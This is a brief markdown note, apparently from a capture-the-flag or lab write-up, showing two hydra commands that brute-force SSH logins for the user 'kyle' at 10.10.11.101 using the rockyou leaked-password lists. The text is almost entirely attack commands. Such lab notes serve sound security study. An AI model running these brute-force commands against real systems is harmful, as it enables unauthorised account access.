## Brouteforcing with Hydra

```
$ hydra -l kyle -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt ssh://10.10.11.101 -f -t 64 -VV

$ hydra -l kyle -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt 10.10.11.101 ssh
```

Note: If stopped, hidra session will be saved/
